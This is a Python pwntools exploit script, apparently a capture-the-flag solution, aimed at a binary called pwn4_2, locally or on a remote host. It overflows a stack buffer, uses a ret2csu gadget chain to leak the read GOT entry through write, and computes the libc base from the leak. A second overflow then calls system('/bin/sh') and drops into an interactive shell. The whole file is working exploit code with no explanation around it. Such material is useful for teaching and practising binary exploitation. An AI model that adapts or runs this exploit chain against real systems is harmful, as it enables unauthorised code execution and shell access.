from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["gxh191.top",25538]
libc=ELF('./libc.so.6')
elf = ELF('./pwn4_2')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn4_2")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

#gdb.attach(p)
write_got = elf.got['write']
read_got = elf.got['read']
csuaddr = 0x40124a
csuaddr2 = 0x401230
main = p64(0x4011b0)
ret = p64(0x40101a)
rdi = p64(0x401253)

def csu(rdi,rsi,rdx,got,last):
    payload = p64(csuaddr) + p64(0) + p64(1) + p64(rdi) + p64(rsi) + p64(rdx) + p64(got)
    payload += p64(last)
    return payload

ru(b';)\n')
payload = b'a' * (0x10 + 8) + csu(1,read_got,0x8,write_got,0x4011b0)
s(payload)
payload = b'a' * (0x10) + p64(1) + p64(csuaddr2) + b'a' * 0x38 + main
ru(b';)\n')
s(payload)
leak_addr = u64(rc(6).ljust(8,b'\x00'))
libc_base = leak_addr - libc.sym['read']
pr("libc_base",libc_base)
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
ru(b';)\n')
payload = b'a' * (0x10 + 8) + rdi + p64(binsh) + p64(system)
s(payload)

shell()